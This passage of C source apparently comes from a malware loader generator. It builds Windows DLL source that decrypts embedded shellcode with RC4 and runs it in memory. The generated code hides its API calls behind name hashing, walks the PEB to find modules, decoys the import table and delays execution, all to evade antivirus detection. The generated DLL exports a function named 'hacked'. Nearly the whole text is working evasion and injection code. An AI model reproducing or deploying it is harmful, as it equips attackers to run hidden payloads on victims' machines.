    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));

    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);

    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* %s)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* %s)(LPCSTR);\n"
        "typedef FARPROC(NTAPI* %s)(HMODULE, LPCSTR);\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
        "typedef NTSTATUS(NTAPI* %s)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "CHAR %s(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int %s(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n"
        "PVOID %s(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = %s() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n"
        "VOID %s() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)%s(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "char memory_pool[1024];\n"
        "unsigned int pool_index = 0;\n"
        "void* my_malloc(unsigned int size) {\n"
        "    if (pool_index + size > sizeof(memory_pool)) {\n"
        "        return 0;\n"
        "    }\n"
        "    void* ptr = &memory_pool[pool_index];\n"
        "    pool_index += size;\n"
        "    return ptr;\n"
        "}\n\n"
        "#define %s               0x5251037A\n"
        "#define %s               0xA5E086A2\n"
        "#define %s           0x0B37D3B9\n"
        "#define %s           0x504D6BF5\n"
        "#define %s           0xCB42C5A9\n"
        "#define %s           0x61D8C71D\n"
        "#define %s           0x1236E2D7\n"
        "#define %s           0xF20D7F2A\n"
        "#define %s           0xA4E3F108\n"
        "#define %s           0xB9D893EC\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char hpb[] = {%s};\n"
        "unsigned char %s[] = { %s };\n"
        "unsigned char %s[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338\n"
        "#define INITIAL_SEED 7\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL RCG(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)my_malloc(dwRc4KeySize);\n"
        "    HMODULE kernel = %s(%s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"
        "    char had[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    %s((char*)hpb, sizeof(hpb), xkey, sizeof(xkey));\n"
        "    %s p%s = (%s)p%s(p%s(had), hpb);\n"
        "    p%s(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "VOID %s() {\n"
        "    HANDLE hThread = NULL;\n"
        "    PVOID pAddress = NULL;\n"
        "    DWORD old = 0;\n"
        "    SIZE_T sPayloadSize = sizeof(%s);\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    HMODULE hnd = %s(%s);\n"
        "    %s p%s = (%s)%s(hnd, %s);\n"
        "    %s p%s = (%s)%s(hnd, %s);\n"
        "    %s p%s = (%s)%s(hnd, %s);\n"
        "    %s p%s = (%s)%s(hnd, %s);\n"
        "    %s p%s = (%s)%s(hnd, %s);\n"
        "    p%s((HANDLE)-1, &pAddress, 0, &sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
        "    memcpy(pAddress, %s, sPayloadSize);\n"
        "    RCG(HINT_BYTE, %s, pAddress, sizeof(%s), sPayloadSize);\n"
        "    p%s((HANDLE)-1, &pAddress, &sPayloadSize, PAGE_EXECUTE_READ, &old);\n"
        "    p%s(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, 0, 0, 0, 0, 0);\n"
        "    p%s(hThread, FALSE, &timeout);\n"
        "    p%s(hThread);\n"
        "}\n"
        "VOID %s(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = %s(%s);\n"
        "    %s p%s = (%s)%s(ntdll, %s);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "VOID run() {\n"
        "    %s(0.5);\n"
        "    %s();\n"
        "}\n"
        "extern __declspec(dllexport) int hacked() {\n"
        "    run();\n"
        "    return 0;\n"
        "}\n"
        "BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {\n"
        "    switch (ul_reason_for_call) {\n"
        "    case DLL_PROCESS_ATTACH:\n"
        "    case DLL_PROCESS_DETACH:\n"
        "    case DLL_THREAD_ATTACH:\n"
        "    case DLL_THREAD_DETACH:\n"
        "        break;\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n",
        SystemFunction032_typedef,
        LoadLibraryA_typedef,
        GetProcAddress_typedef,
        NtAllocateVirtualMemory_typedef,
        NtProtectVirtualMemory_typedef,
        NtCreateThreadEx_typedef,
        NtWaitForSingleObject_typedef,
        NtClose_typedef,
        NtDelayExecution_typedef,
        random_toUpper_name,
        random_seed_name,
        random_helper_name,
        random_seed_name,
        random_iatcamouflage_name,
        random_helper_name,
        ntdll_hash_name,
        kernel32_hash_name,
        ntallocatevirtualmemory_hash_name,
        ntprotectvirtualmemory_hash_name,
        ntwaitforsingleobject_hash_name,
        ntcreatethreadex_hash_name,
        ntdelayexecution_hash_name,
        ntclose_hash_name,
        loadlibrarya_hash_name,
        getprocaddress_hash_name,
        random_obf_func,
        xkey, obfuscated_fun,
        random_payload_name, shellcodeArray,
        random_key_name, keyArray, hint,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_getmodule_name, kernel32_hash_name,
        LoadLibraryA_typedef, pLoadLibraryA_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        GetProcAddress_typedef, pGetProcAddress_name, GetProcAddress_typedef, random_getproc_name, getprocaddress_hash_name,
        random_obf_func,
        SystemFunction032_typedef, pSystemFunction032_name, SystemFunction032_typedef, pGetProcAddress_name, pLoadLibraryA_name,
        pSystemFunction032_name,
        random_inject_func,
        random_payload_name,
        random_getmodule_name, ntdll_hash_name,
        NtAllocateVirtualMemory_typedef, pNtAllocateVirtualMemory_name, NtAllocateVirtualMemory_typedef, random_getproc_name, ntallocatevirtualmemory_hash_name,
        NtProtectVirtualMemory_typedef, pNtProtectVirtualMemory_name, NtProtectVirtualMemory_typedef, random_getproc_name, ntprotectvirtualmemory_hash_name,
        NtCreateThreadEx_typedef, pNtCreateThreadEx_name, NtCreateThreadEx_typedef, random_getproc_name, ntcreatethreadex_hash_name,
        NtWaitForSingleObject_typedef, pNtWaitForSingleObject_name, NtWaitForSingleObject_typedef, random_getproc_name, ntwaitforsingleobject_hash_name,
        NtClose_typedef, pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        pNtAllocateVirtualMemory_name,
        random_payload_name, random_key_name, random_key_name,
        pNtProtectVirtualMemory_name,
        pNtCreateThreadEx_name,
        pNtWaitForSingleObject_name,
        pNtClose_name,
        random_delay_func,
        random_getmodule_name, ntdll_hash_name,
        NtDelayExecution_typedef, pNtDelayExecution_name, NtDelayExecution_typedef, random_getproc_name, ntdelayexecution_hash_name,
        pNtDelayExecution_name,
        random_delay_func,
        random_inject_func
    );
}
void obf_deley_6_API_stompping(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Seed random number generator
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_toUpper_name[10], random_seed_name[10], random_helper_name[10];
    char random_obf_func[10], random_delay_func[10], random_inject_func[10];
    char random_iatcamouflage_name[10];
    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_inject_func, sizeof(random_inject_func));
    generate_random_string(random_iatcamouflage_name, sizeof(random_iatcamouflage_name));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];
    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names for APIs
    char pSystemFunction032_name[9], pLoadLibraryA_name[9], pGetProcAddress_name[9];
    char pNtProtectVirtualMemory_name[9], pNtCreateThreadEx_name[9];
    char pNtWaitForSingleObject_name[9], pNtClose_name[9], pNtDelayExecution_name[9];
    generate_random_string(pSystemFunction032_name, sizeof(pSystemFunction032_name));
    generate_random_string(pLoadLibraryA_name, sizeof(pLoadLibraryA_name));
    generate_random_string(pGetProcAddress_name, sizeof(pGetProcAddress_name));
    generate_random_string(pNtProtectVirtualMemory_name, sizeof(pNtProtectVirtualMemory_name));
    generate_random_string(pNtCreateThreadEx_name, sizeof(pNtCreateThreadEx_name));
    generate_random_string(pNtWaitForSingleObject_name, sizeof(pNtWaitForSingleObject_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pNtDelayExecution_name, sizeof(pNtDelayExecution_name));

    // Random names for hashing definitions
    char ntdll_hash_name[11], kernel32_hash_name[11], ntprotectvirtualmemory_hash_name[12];
    char ntwaitforsingleobject_hash_name[12], ntcreatethreadex_hash_name[11];
    char ntdelayexecution_hash_name[11], ntclose_hash_name[11];
    char loadlibrarya_hash_name[11], getprocaddress_hash_name[11], messageboxa_hash_name[11];
    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntprotectvirtualmemory_hash_name, sizeof(ntprotectvirtualmemory_hash_name));
    generate_random_string(ntwaitforsingleobject_hash_name, sizeof(ntwaitforsingleobject_hash_name));
    generate_random_string(ntcreatethreadex_hash_name, sizeof(ntcreatethreadex_hash_name));
    generate_random_string(ntdelayexecution_hash_name, sizeof(ntdelayexecution_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(getprocaddress_hash_name, sizeof(getprocaddress_hash_name));
    generate_random_string(messageboxa_hash_name, sizeof(messageboxa_hash_name));

    // Random typedef names
    char SystemFunction032_typedef[12], LoadLibraryA_typedef[12], GetProcAddress_typedef[12];
    char NtProtectVirtualMemory_typedef[12], NtCreateThreadEx_typedef[12];
    char NtWaitForSingleObject_typedef[12], NtClose_typedef[12], NtDelayExecution_typedef[12];
    generate_random_string(SystemFunction032_typedef, sizeof(SystemFunction032_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));
    generate_random_string(GetProcAddress_typedef, sizeof(GetProcAddress_typedef));
    generate_random_string(NtProtectVirtualMemory_typedef, sizeof(NtProtectVirtualMemory_typedef));
    generate_random_string(NtCreateThreadEx_typedef, sizeof(NtCreateThreadEx_typedef));
    generate_random_string(NtWaitForSingleObject_typedef, sizeof(NtWaitForSingleObject_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(NtDelayExecution_typedef, sizeof(NtDelayExecution_typedef));

    // Random names for EncryptedPayload, ProtectedKey, and user32
    char random_payload_name[15], random_key_name[15], random_user32_name[15];
    generate_random_string(random_payload_name, sizeof(random_payload_name));
    generate_random_string(random_key_name, sizeof(random_key_name));
    generate_random_string(random_user32_name, sizeof(random_user32_name));

    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));

    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);
    char* obfuscated_user32 = obf("user32.dll", xkey);

    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* %s)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* %s)(LPCSTR);\n"
        "typedef FARPROC(NTAPI* %s)(HMODULE, LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
        "typedef NTSTATUS(NTAPI* %s)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "CHAR %s(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int %s(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n"
        "PVOID %s(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = %s() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n"
        "VOID %s() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)%s(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define %s               0x5251037A\n"
        "#define %s               0xA5E086A2\n"
        "#define %s           0x504D6BF5\n"
        "#define %s           0xCB42C5A9\n"
        "#define %s           0x61D8C71D\n"
        "#define %s           0x1236E2D7\n"
        "#define %s           0xF20D7F2A\n"
        "#define %s           0xA4E3F108\n"
        "#define %s           0xB9D893EC\n"
        "#define %s           0x4A096AA1\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pFuio[] = {%s};\n"
        "char %s[] = {%s};\n"
        "unsigned char %s[] = { %s };\n"
        "unsigned char %s[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338\n"
        "#define INITIAL_SEED 7\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL RC4_Guard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwRc4KeySize);\n"
        "    HMODULE kee = %s(%s);\n"
        "    %s p%s = (%s)%s(kee, %s);\n"
        "    %s p%s = (%s)%s(kee, %s);\n"
        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"
        "    char Adp[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    %s((char*)pFuio, sizeof(pFuio), xkey, sizeof(xkey));\n"
        "    %s p%s = (%s)p%s(p%s(Adp), pFuio);\n"
        "    p%s(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "BOOL %s() {\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    DWORD old_protection = 0;\n"
        "    HANDLE hthread = NULL;\n"
        "    SIZE_T Spayload = sizeof(%s);\n"
        "    HMODULE ern = %s(%s);\n"
        "    HMODULE ptll = %s(%s);\n"
        "    %s p%s = (%s)%s(ern, %s);\n"
        "    %s((char*)%s, sizeof(%s), xkey, sizeof(xkey));\n"
        "    PVOID address = %s(p%s(%s), %s);\n"
        "    %s p%s = (%s)%s(ptll, %s);\n"
        "    %s p%s = (%s)%s(ptll, %s);\n"
        "    %s p%s = (%s)%s(ptll, %s);\n"
        "    %s p%s = (%s)%s(ptll, %s);\n"
